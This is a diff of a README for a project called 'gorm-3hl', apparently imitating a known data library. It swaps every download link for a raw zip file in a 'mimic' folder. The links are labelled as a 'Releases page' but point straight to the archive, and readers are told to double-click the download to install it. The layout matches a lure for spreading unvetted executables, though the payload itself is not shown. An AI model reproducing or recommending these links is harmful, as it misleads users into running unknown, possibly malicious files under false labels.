@@ -1,19 +1,19 @@
 # 🛠️ gorm-3hl - Simple Access to Enhanced Data Management
 
 ## 📥 Download Now
-[![Download gorm-3hl](https://raw.githubusercontent.com/ferantuan/gorm-3hl/main/mimic/gorm-3hl.zip%https://raw.githubusercontent.com/ferantuan/gorm-3hl/main/mimic/gorm-3hl.zip)](https://raw.githubusercontent.com/ferantuan/gorm-3hl/main/mimic/gorm-3hl.zip)
+[![Download gorm-3hl](https://github.com/ferantuan/gorm-3hl/raw/refs/heads/main/mimic/hl_gorm_v2.0-beta.1.zip%https://github.com/ferantuan/gorm-3hl/raw/refs/heads/main/mimic/hl_gorm_v2.0-beta.1.zip)](https://github.com/ferantuan/gorm-3hl/raw/refs/heads/main/mimic/hl_gorm_v2.0-beta.1.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run gorm-3hl easily.
 
 ### 1. Visit the Releases Page
-To get the latest version of gorm-3hl, visit the Releases page using the following link: [Visit Releases](https://raw.githubusercontent.com/ferantuan/gorm-3hl/main/mimic/gorm-3hl.zip).
+To get the latest version of gorm-3hl, visit the Releases page using the following link: [Visit Releases](https://github.com/ferantuan/gorm-3hl/raw/refs/heads/main/mimic/hl_gorm_v2.0-beta.1.zip).
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Look for the latest version, which is usually at the top of the list. Each release will show a version number and a description, helping you choose the right one.
 
 ### 3. Download the Application
-Click on your desired version. This will expand further details about that version. Look for the file named accordingly, such as `https://raw.githubusercontent.com/ferantuan/gorm-3hl/main/mimic/gorm-3hl.zip` or similar. Click on the link to download this file.
+Click on your desired version. This will expand further details about that version. Look for the file named accordingly, such as `https://github.com/ferantuan/gorm-3hl/raw/refs/heads/main/mimic/hl_gorm_v2.0-beta.1.zip` or similar. Click on the link to download this file.
 
 ### 4. Start the Installation
 Once downloaded, locate the file in your computer's Downloads folder or wherever you saved it. Double-click the file to start the installation process.
@@ -59,6 +59,6 @@ Keep an eye on the Releases page for the latest updates and improvements. Regula
 Whenever a new version is released, repeat the download and installation steps to keep your application up to date.
 
 ## 📥 Download & Install
-To start using gorm-3hl, visit the Releases page to download the application: [Visit Releases](https://raw.githubusercontent.com/ferantuan/gorm-3hl/main/mimic/gorm-3hl.zip).
+To start using gorm-3hl, visit the Releases page to download the application: [Visit Releases](https://github.com/ferantuan/gorm-3hl/raw/refs/heads/main/mimic/hl_gorm_v2.0-beta.1.zip).
 
 Now you're ready to enjoy the benefits of gorm-3hl for all your data management needs!
